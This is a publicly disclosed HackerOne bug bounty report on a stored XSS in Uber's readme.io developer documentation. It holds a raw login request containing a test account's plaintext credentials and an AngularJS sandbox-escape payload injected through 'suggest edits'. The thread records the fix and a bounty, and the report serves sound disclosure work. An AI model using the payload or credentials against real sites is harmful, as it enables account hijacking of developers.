{"id":131450,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzE0NTA=","url":"https://hackerone.com/reports/131450","title":"Stored XSS in developer.uber.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-04-16T22:25:38.643Z","submitted_at":"2016-04-16T22:25:38.643Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"albinowax","url":"/albinowax","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-27T12:37:42.236Z","bug_reporter_agreed_on_going_public_at":"2016-05-28T12:37:41.349Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"An attacker can make a series of requests to https://uber.readme.io/ that will result in permanent defacement/stored XSS of all the documentation pages on https://developer.uber.com/\n\nI'm not entirely sure if this is in scope, but it could definitely have a major impact on developer.uber.com so I figure you'd like to know either way. \n\n\nReproduction steps:\n\nLoad https://uber.readme.io/docs/deep-linking to get a connect.sid cookie\nAuthenticate the session by sending the following request to uber.readme.io:\n```\nPOST /users/session HTTP/1.1\nHost: uber.readme.io\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 84\nCookie: YOUR CONNECT.SID COOKIE HERE\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\n\n{\"email\":\"readme2@thursday.eml.cc\",\"password\":\"pjJnBODjkLFv!!11\",\"action\":\"session\"}\n```\n\nIf this worked, you'll see a response body something like \n```\n{\"id\":\"57129b7365324b0e002ad83b\",\"name\":\"James Kettle\",\"email\":\"readme2@thursday.eml.cc\",\"username\":\"\",\"provider\":\"local\",\"createdAt\":\"2016-04-16T20:07:15.871Z\",\"accessToken\":\"\",\"stripeId\":\"\",\"hasStripe\":false,\"email_verified\":false,\"hasGithub\":false,\"github\":{},\"is_admin\":false,\"is_god\":false}\n```\nGrab the new connect.sid cookie from this response.\n\nUsing the new connect.sid cookie value, load https://uber.readme.io/docs/deep-linking/edit - you should land on a 'Suggest edits' page (see screenshot)\n\nAdd the following payload into the document:\n```{{(_=\"\".sub).call.call({}[$=\"constructor\"].getOwnPropertyDescriptor(_.__proto__,$).value,0,\"alert(1)\")()}}```\nThen enter an arbitrary description then press 'suggest edits'. \n\nWhen an administrator next views the readme dashboard and clicks on the suggested edit, the injected JavaScript will execute (see screenshot). This JavaScript could automatically approve the suggestion.\n\nCongrats, you've now got your own JavaScript executing on https://uber.readme.io/docs/deep-linking - potentially hijacking the account of every developer who views it. \n\nThe obvious way to patch this is using the ng-nonbindable directive to nullify the stored-xss-via-suggested-edits problem. However, since readme.io appears to have a weak security posture, it may be worth considering shifting the readme.io-powered documentation to a separate domain from developer.uber.com, to ensure that XSS in readme.io can't hijack developer accounts.\n\nLet me know if a video would be helpful.","vulnerability_information_html":"\u003cp\u003eAn attacker can make a series of requests to \u003ca title=\"https://uber.readme.io/\" href=\"/redirect?url=https%3A%2F%2Fuber.readme.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://uber.readme.io/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that will result in permanent defacement/stored XSS of all the documentation pages on \u003ca title=\"https://developer.uber.com/\" href=\"/redirect?url=https%3A%2F%2Fdeveloper.uber.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developer.uber.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m not entirely sure if this is in scope, but it could definitely have a major impact on developer.uber.com so I figure you\u0026#39;d like to know either way. \u003c/p\u003e\n\n\u003cp\u003eReproduction steps:\u003c/p\u003e\n\n\u003cp\u003eLoad \u003ca title=\"https://uber.readme.io/docs/deep-linking\" href=\"/redirect?url=https%3A%2F%2Fuber.readme.io%2Fdocs%2Fdeep-linking\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://uber.readme.io/docs/deep-linking\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to get a connect.sid cookie\u003cbr\u003e\nAuthenticate the session by sending the following request to uber.readme.io:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /users/session HTTP/1.1\nHost: uber.readme.io\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 84\nCookie: YOUR CONNECT.SID COOKIE HERE\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\n\n{\u0026quot;email\u0026quot;:\u0026quot;readme2@thursday.eml.cc\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;pjJnBODjkLFv!!11\u0026quot;,\u0026quot;action\u0026quot;:\u0026quot;session\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf this worked, you\u0026#39;ll see a response body something like \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;id\u0026quot;:\u0026quot;57129b7365324b0e002ad83b\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;James Kettle\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;readme2@thursday.eml.cc\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;provider\u0026quot;:\u0026quot;local\u0026quot;,\u0026quot;createdAt\u0026quot;:\u0026quot;2016-04-16T20:07:15.871Z\u0026quot;,\u0026quot;accessToken\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;stripeId\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;hasStripe\u0026quot;:false,\u0026quot;email_verified\u0026quot;:false,\u0026quot;hasGithub\u0026quot;:false,\u0026quot;github\u0026quot;:{},\u0026quot;is_admin\u0026quot;:false,\u0026quot;is_god\u0026quot;:false}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eGrab the new connect.sid cookie from this response.\u003c/p\u003e\n\n\u003cp\u003eUsing the new connect.sid cookie value, load \u003ca title=\"https://uber.readme.io/docs/deep-linking/edit\" href=\"/redirect?url=https%3A%2F%2Fuber.readme.io%2Fdocs%2Fdeep-linking%2Fedit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://uber.readme.io/docs/deep-linking/edit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - you should land on a \u0026#39;Suggest edits\u0026#39; page (see screenshot)\u003c/p\u003e\n\n\u003cp\u003eAdd the following payload into the document:\u003cbr\u003e\n\u003ccode\u003e{{(_=\u0026quot;\u0026quot;.sub).call.call({}[$=\u0026quot;constructor\u0026quot;].getOwnPropertyDescriptor(_.__proto__,$).value,0,\u0026quot;alert(1)\u0026quot;)()}}\u003c/code\u003e\u003cbr\u003e\nThen enter an arbitrary description then press \u0026#39;suggest edits\u0026#39;. \u003c/p\u003e\n\n\u003cp\u003eWhen an administrator next views the readme dashboard and clicks on the suggested edit, the injected JavaScript will execute (see screenshot). This JavaScript could automatically approve the suggestion.\u003c/p\u003e\n\n\u003cp\u003eCongrats, you\u0026#39;ve now got your own JavaScript executing on \u003ca title=\"https://uber.readme.io/docs/deep-linking\" href=\"/redirect?url=https%3A%2F%2Fuber.readme.io%2Fdocs%2Fdeep-linking\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://uber.readme.io/docs/deep-linking\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e - potentially hijacking the account of every developer who views it. \u003c/p\u003e\n\n\u003cp\u003eThe obvious way to patch this is using the ng-nonbindable directive to nullify the stored-xss-via-suggested-edits problem. However, since readme.io appears to have a weak security posture, it may be worth considering shifting the readme.io-powered documentation to a separate domain from developer.uber.com, to ensure that XSS in readme.io can\u0026#39;t hijack developer accounts.\u003c/p\u003e\n\n\u003cp\u003eLet me know if a video would be helpful.\u003c/p\u003e\n","bounty_amount":"7500.0","formatted_bounty":"$7,500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-06-27T12:37:41.680Z","allow_singular_disclosure_after":-142184839.90867472,"singular_disclosure_allowed":true,"vote_count":205,"voters":["lukasreschke","philip","irek","dirk","arneswinnen","sp1d3rs","jensec","sultancad","bendtheory","albinowax","and 195 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":912585,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @albinowax - sounds like an interesting issue, have you contacted `readme.io` about this issue yet?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e - sounds like an interesting issue, have you contacted \u003ccode\u003ereadme.io\u003c/code\u003e about this issue yet?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-18T18:01:47.735Z","updated_at":"2016-04-18T18:01:47.735Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":912608,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I haven't - based on how quickly https://hackerone.com/reports/125027 was patched, I assumed you have a good contact there. I'm happy to try and make contact directly though.","markdown_message":"\u003cp\u003eI haven\u0026#39;t - based on how quickly \u003ca title=\"https://hackerone.com/reports/125027\" href=\"https://hackerone.com/reports/125027\"\u003ehttps://hackerone.com/reports/125027\u003c/a\u003e was patched, I assumed you have a good contact there. I\u0026#39;m happy to try and make contact directly though.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-18T18:08:38.552Z","updated_at":"2016-04-18T18:08:38.552Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":912850,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @mandatoryuber, Marc from readme.io replied that Uber contacted him about this issue yesterday and he patched it then. It looks fixed to me.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/mandatoryuber\"\u003e@mandatoryuber\u003c/a\u003e, Marc from readme.io replied that Uber contacted him about this issue yesterday and he patched it then. It looks fixed to me.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-18T19:13:32.321Z","updated_at":"2016-04-18T19:25:44.432Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":913063,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Ah that's good - out of curiosity did Marc mention who reached out to him from our end? Just asked around the team and it doesn't appear anyone did that :). Just want to track down who originally validated this report. Closing as `Resolved` for now but that's a TODO before we do rewarding on this one.","markdown_message":"\u003cp\u003eAh that\u0026#39;s good - out of curiosity did Marc mention who reached out to him from our end? Just asked around the team and it doesn\u0026#39;t appear anyone did that :). Just want to track down who originally validated this report. Closing as \u003ccode\u003eResolved\u003c/code\u003e for now but that\u0026#39;s a TODO before we do rewarding on this one.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-18T20:31:45.693Z","updated_at":"2016-04-18T20:31:45.693Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"albinowax","url":"/albinowax"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":913116,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Never mind, this was solved :) we found the appropriate contact who let Readme know. Thanks.","markdown_message":"\u003cp\u003eNever mind, this was solved :) we found the appropriate contact who let Readme know. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-18T20:47:42.049Z","updated_at":"2016-04-18T20:47:42.049Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":937576,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hey @albinowax cool exploit, thanks for the submission and please let us know if you find anything else.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/albinowax\"\u003e@albinowax\u003c/a\u003e cool exploit, thanks for the submission and please let us know if you find anything else.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-02T22:54:23.706Z","updated_at":"2016-05-02T22:54:23.706Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"bounty_amount":"7500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"uber","collaborator":{"username":"albinowax","url":"/albinowax"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":988976,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks! I'll be sure to keep looking.","markdown_message":"\u003cp\u003eThanks! I\u0026#39;ll be sure to keep looking.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-28T12:37:41.565Z","updated_at":"2016-05-28T12:37:41.565Z","first_to_agree":true,"actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1012929,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Could we publicly disclose this?","markdown_message":"\u003cp\u003eCould we publicly disclose this?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-14T13:28:29.069Z","updated_at":"2016-06-14T13:28:29.069Z","actor":{"username":"albinowax","cleared":true,"url":"/albinowax","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1040579,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-27T12:37:42.310Z","updated_at":"2016-06-27T12:37:42.310Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}